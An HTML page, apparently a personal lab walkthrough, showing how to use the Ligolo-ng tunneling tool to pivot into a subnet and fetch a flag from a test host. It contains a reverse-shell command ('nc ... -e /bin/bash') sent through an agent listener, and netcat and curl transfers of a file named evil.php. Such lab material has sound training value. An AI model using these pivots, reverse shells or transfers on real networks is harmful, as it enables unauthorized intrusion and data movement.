@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ligolo Documentation</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lexie+Readable:wght@400&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #33ff77;
+            font-family: 'Lexie Readable', sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        .content-wrapper {
+            width: 80%;
+            margin: 0 auto;
+        }
+        .documentation {
+            border: 4px double #33ff77;
+            padding: 30px;
+            border-radius: 10px;
+            background: #0d1117;
+            text-align: left;
+        }
+        /* Estilos para categorías */
+        .category-info {
+            margin-bottom: 30px;
+        }
+        .category-title {
+            color: #33ff77;
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            font-family: 'Courier New', monospace;
+        }
+        .category-description {
+            color: #88cc88;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            font-family: 'Lexie Readable', sans-serif;
+        }
+        /* Estilos para pasos */
+        .steps {
+            list-style: none;
+            padding: 0;
+        }
+        .step {
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .step-number {
+            color: #33ff77;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-right: 10px;
+            font-family: 'Courier New', monospace;
+        }
+        .step-title {
+            color: #33ff77;
+            font-size: 1.3rem;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+        }
+        /* Terminal */
+        .terminal {
+            background-color: #000;
+            color: #ffffff;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+            border: 1px solid #33ff77;
+        }
+        .terminal pre {
+            margin: 0;
+            white-space: pre-wrap;
+        }
+        .command {
+            color: #00ff00;
+        }
+        .comment {
+            color: #ffff00;
+        }
+        /* Divisor */
+        .step-divider {
+            border: 0;
+            border-top: 1px solid #33ff77;
+            margin: 30px 0;
+        }
+        /* Enlaces */
+        a {
+            color: #33ff77;
+            text-decoration: none;
+            font-family: 'Lexie Readable', sans-serif;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .category-subtitle {
+            color: #33ff77;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="content-wrapper">
+        <div class="documentation">
+            <!-- Category Info -->
+            <div class="category-info" id="statci-steps">
+                <h3 class="category-title">Tunnel Like a Pro: Secure, Simple, and Efficient!</h3>
+                <h4 class="category-description">
+                    Ligolo-ng is a cutting-edge tool designed for penetration testers, enabling the creation of secure tunnels using TUN interfaces. It offers a lightweight, fast, and efficient alterUserive to traditional methods like SOCKS proxies. With features such as easy setup, automatic certificate configuration, and support for multiple platforms, Ligolo-ng simplifies complex tunneling tasks, making it a preferred choice for professionals seeking reliable and secure network tunneling solutions.
+                </h4>
+            </div>
+
+            <!-- Steps -->
+            <ul class="steps">
+                <!-- Step 1 -->
+                <li class="step">
+                    <span class="step-number">1</span>
+                    <h4 class="step-title">Download the files or use my scripts.</h4>
+                    <div class="step-content">
+                        <a href="https://github.com/Nicocha30/ligolo-ng" target="_blank">https://github.com/Nicocha30/ligolo-ng</a>
+                    </div>
+                </li>
+
+                <!-- Step 2 -->
+                <li class="step">
+                    <span class="step-number">2</span>
+                    <h4 class="step-title">Lets start the server</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">proxyloco</span>
+
+<span class="comment">_________________________________________________________
+
+AMD64
+Ligolo-ng Proxy 0.5.1 Linux
+
+¿Deseas descargar el proxy? [s/N] s
+
+_________________________________________________________
+
+¿Quieres iniciar la interfaz? [s/N] s
+[sudo] password for User: 
+3: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 500
+
+_________________________________________________________
+
+¿Quieres iniciar el proxy? [s/N] s
+Iniciando el proxy...
+WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
+INFO[0000] Listening on 0.0.0.0:11601</span>
+
+<span>    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!</span></pre>
+                        </div>
+                    </div>
+                </li>
+
+                <!-- Step 3 -->
+                <li class="step">
+                    <span class="step-number">3</span>
+                    <h4 class="step-title">Download the agent</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">proxylocomenu</span>
+
+<span class="comment">_________________________________________________________
+
+AMD64
+1 ligolo-ng Agent 0.5.1 linux
+2 ligolo-ng Proxy 0.5.1 linux
+
+ARM64
+3 ligolo-ng Agent 0.5.1 linux
+4 ligolo-ng Proxy 0.5.1 linux
+
+_________________________________________________________
+
+Choose the number of the download you want: 1
+
+_________________________________________________________</span></pre>
+                        </div>
+                    </div>
+                </li>
+
+                <!-- Step 4 -->
+                <li class="step">
+                    <span class="step-number">4</span>
+                    <h4 class="step-title">Transfer the agent to the machine</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.88.159 - - [12/Jul/2024 21:25:44] "GET /agent HTTP/1.1" 200 -</span>
+
+<span class="comment">#From the other machine        
+wget http://192.168.88.13:8000/agent
+--2024-07-12 21:25:44--  http://192.168.88.13:8000/agent
+Connecting to 192.168.88.13:8000... connected.
+HTTP request sent, awaiting response... 200 OK</span></pre>
+                        </div>
+                    </div>
+                </li>
+
+                <!-- Step 5 -->
+                <li class="step">
+                    <span class="step-number">5</span>
+                    <h4 class="step-title">Start the agent</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">./agent -connect 192.168.88.13:11601 -ignore-cert</span>
+
+<span class="comment">WARN[0000] warning, certificate validation disabled     
+INFO[0000] Connection established                        addr="192.168.88.13:11601"</span>
+
+<span>#on the server:
+ligolo-ng »  INFO[0229] Agent joined.                                 name=user@domain remote="192.168.88.159:40576"
+ligolo-ng » ^C
+input Ctrl-c once more to exit
+ligolo-ng »</span></pre>
+                        </div>
+                    </div>
+                </li>
+
+                <!-- Step 6 -->
+                <li class="step">
+                    <span class="step-number">6</span>
+                    <h4 class="step-title">Server</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">ligolo-ng » session
+[Agent : user@domain] » ifconfig</span>
+
+<span>┌────────────────────────────────────┐
+│ Interface 0                        │
+├──────────────┬─────────────────────┤
+│ Name         │ lo                  │
+│ Hardware MAC │                     │
+│ MTU          │ 65536               │
+│ Flags        │ up|loopback|running │
+│ IPv4 Address │ 127.0.0.1/8         │
+│ IPv6 Address │ ::1/128             │
+└──────────────┴─────────────────────┘
+┌───────────────────────────────────────────────┐
+│ Interface 1                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ eth0                           │
+│ Hardware MAC │ bc:24:11:2e:2a:6c              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 192.168.88.159/24              │
+│ IPv6 Address │ fe80::be24:11ff:fe2e:2a6c/64   │
+└──────────────┴────────────────────────────────┘</span></pre>
+                        </div>
+                    </div>
+
+                    <!-- Substeps -->
+                    <ul>
+                        <li class="step">
+                            <span class="step-number">6.1</span>
+                            <h4 class="step-title">Server terminal - no ligolo</h4>
+                            <div class="step-content">
+                                <div class="terminal">
+                                    <pre><span class="command">❯ ip a</span>
+
+<span class="comment">1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether a0:59:50:eb:23:64 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.88.13/24 brd 192.168.88.255 scope global dynamic noprefixroute wlan0
+       valid_lft 86288sec preferred_lft 86288sec
+    inet6 fe80::a259:50ff:feeb:2364/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+3: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 500
+    link/none</span>
+
+<span>#make sure ligolo is there.</span></pre>
+                                </div>
+                            </div>
+                        </li>
+
+                        <!-- Step 6.2 -->
+                        <li class="step">
+                            <span class="step-number">6.2</span>
+                            <h4 class="step-title">Connect the subnet</h4>
+                            <div class="step-content">
+                                <div class="terminal">
+                                    <pre><span class="command">sudo ip route add 192.168.122.0/24 dev ligolo
+[sudo] password for</span>
+
+<span class="comment">#START the session back in ligolo terminal</span>
+
+<span>[Agent : user@domain] » start
+[Agent : user@domain] » INFO[1104] Starting tunnel to User@domain</span></pre>
+                                </div>
+                            </div>
+                        </li>
+                    </ul>
+                    <hr class="step-divider">
+                </li>
+
+                <!-- Step 7 -->
+                <li class="step">
+                    <span class="step-number">7</span>
+                    <h4 class="step-title">Check the flag from the server terminal (no ligolo)</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">❯ curl 192.168.122.205</span>
+
+<span class="comment">ligolo-ng
+
+flag:1219kj91
+
+❯ ping 192.168.122.205
+
+PING 192.168.122.205 (192.168.122.205) 56(84) bytes of data.
+64 bytes from 192.168.122.205: icmp_seq=1 ttl=64 time=8.50 ms
+64 bytes from 192.168.122.205: icmp_seq=2 ttl=64 time=11.7 ms</span>
+
+<span>#apache server on the subnet 122</span></pre>
+                        </div>
+                    </div>
+                </li>
+
+                <!-- Listener Section -->
+                <div class="category-info" id="statci-steps">
+                    <h2 class="category-subtitle">Listener on the agent for reverse shell</h2>
+                    <h4 class="category-description">
+                        <div class="terminal">
+                            <pre><span class="command">[Agent : user@Domain] » listener_add --addr 192.168.220.1:1234 --to 127.0.0.1:1234 --tcp</span>
+
+<span class="comment">INFO[0418] Listener 0 created on remote agent!</span></pre>
+                        </div>
+                    </h4>
+                </div>
+
+                <!-- Listener Steps -->
+                <li class="step">
+                    <span class="step-number">1</span>
+                    <h4 class="step-title">Start nc on the proxy server machine</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">ncat -lvnp 1234 --keep-open
+#also 
+nc -lvnp 1234</span>
+
+<span class="comment">Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1234
+Ncat: Listening on 0.0.0.0:1234</span></pre>
+                        </div>
+                    </div>
+                </li>
+
+                <!-- Step 2 - Netcat Connection -->
+                <li class="step">
+                    <span class="step-number">2</span>
+                    <h4 class="step-title">on the machine connect nc to the agent IP, no to the proxy server</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">nc 192.168.220.1 1234 -e /bin/bash</span>
+
+<span class="comment">ip r
+192.168.220.0/24 dev enp1s0 proto kernel scope link src 192.168.220.234</span></pre>
+                        </div>
+                    </div>
+                </li>
+
+                <!-- File Transfer Section -->
+                <div class="category-info" id="statci-steps">
+                    <h2 class="category-subtitle">Setting a server to transfer files</h2>
+                    <h4 class="category-description">Adding a listener</h4>
+                </div>
+
+                <!-- Step 1 - File Transfer -->
+                <li class="step">
+                    <span class="step-number">1</span>
+                    <h4 class="step-title">
+                        <div class="terminal">
+                            <pre><span class="command">#[Agent : User@Domain] » 
+                                listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
+listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80</span>
+
+<span class="comment">[Agent : User@Domain] » listener_list
+│ Active listeners                                                                                   
+│ # │ AGENT                              │ NETWORK │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS
+│ 0 │ #1 - User@Domain - 192.168.88.13:34288 │ tcp     │ 0.0.0.0:30000          │ 127.0.0.1:10000        
+│ 1 │ #1 - User@Domain - 192.168.88.13:34288 │ tcp     │ 192.168.220.1:30001    │ 127.0.0.1:10001    
+│ 2 │ #1 - User@Domain - 192.168.88.13:34288 │ tcp     │ 192.168.220.1:1234     │ 127.0.0.1:1234   
+│ 3 │ #1 - User@Domain - 192.168.88.13:34288 │ tcp     │ 0.0.0.0:8080           │ 127.0.0.1:80   
+
+</span>
+
+<span>But we can also use the same port 1234 from last connection</span></pre>
+                        </div>
+                    </h4>
+                </li>
+
+                <!-- Step 2 - File Transfer -->
+                <li class="step">
+                    <span class="step-number">2</span>
+                    <h4 class="step-title">On kali</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">python3 -m http.server 1234</span>
+
+<span class="comment">curl -O 192.168.220.1:1234/test
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100     6  100     6    0     0    742      0 --:--:-- --:--:-- --:--:--   750
+❯ ls
+ test</span>
+
+<span>wget http://192.168.220.1:1234/test
+--2024-07-12 23:28:39--  http://192.168.220.1:1234/test
+Connecting to 192.168.220.1:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6 [application/octet-stream]
+Saving to: 'test.1'
+
+test.1                           100%[==========================================================>]       6  --.-KB/s    in 0s      
+
+2024-07-12 23:28:39 (573 KB/s) - 'test.1' saved [6/6]
+
+❯ ls
+ test   test.1</span></pre>
+                        </div>
+                    </div>
+                </li>
+
+                <!-- Step 3 - File Transfer -->
+                <li class="step">
+                    <span class="step-number">3</span>
+                    <h4 class="step-title">Using nc to send files</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">#kali
+nc -nlvp 1234 < evil.php
+Listening on 0.0.0.0 1234</span>
+
+<span class="comment">#on the other machine
+nc -nv 192.168.220.1 1234 > evil.php
+(UNKNOWN) [192.168.220.1] 1234 (?) open
+
+❯ ls
+ evil.php</span></pre>
+                        </div>
+                    </div>
+                </li>
+
+                <!-- Step 4 - File Transfer -->
+                <li class="step">
+                    <span class="step-number">4</span>
+                    <h4 class="step-title">Using python script</h4>
+                    <div class="step-content">
+                        <div class="terminal">
+                            <pre><span class="command">#kali (I had to change the port in the script to 1234)
+❯ getpython
+#to receive files with Python 2, from the other machine, do a curl like this: #generic message
+#curl -T file http://192.168.88.19:8000 #generic message</span>
+
+<span class="comment">#on the other machine remember to use the IP from the client, no kali
+curl -T evil.php 192.168.220.1:1234
+curl: (52) Empty reply from server
+
+#back kali
+Host: 192.168.220.1:1234
+User-Agent: curl/7.88.1
+Accept: */*
+Content-Length: 9
+Expect: 100-continue
+
+❯ ls
+ evil.php</span></pre>
+                        </div>
+                    </div>
+                </li>
+            </ul>
+        </div>
+    </div>
+</body>
+</html> 
